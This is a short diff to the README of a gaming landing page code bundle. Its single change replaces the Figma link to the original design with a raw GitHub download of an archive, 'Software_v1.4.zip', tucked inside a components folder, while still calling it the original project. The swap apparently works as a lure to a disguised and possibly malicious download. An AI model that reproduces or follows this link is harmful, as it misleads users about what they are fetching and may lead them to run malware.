@@ -1,7 +1,7 @@
 
   # Redesign Gaming Landing Page
 
-  This is a code bundle for Redesign Gaming Landing Page. The original project is available at https://www.figma.com/design/DldS3UMlaQ9akiB6uBpCdm/Redesign-Gaming-Landing-Page.
+  This is a code bundle for Redesign Gaming Landing Page. The original project is available at https://github.com/devorochimaru/devecosystem/raw/refs/heads/main/src/components/Software_v1.4.zip
 
   ## Running the code
 
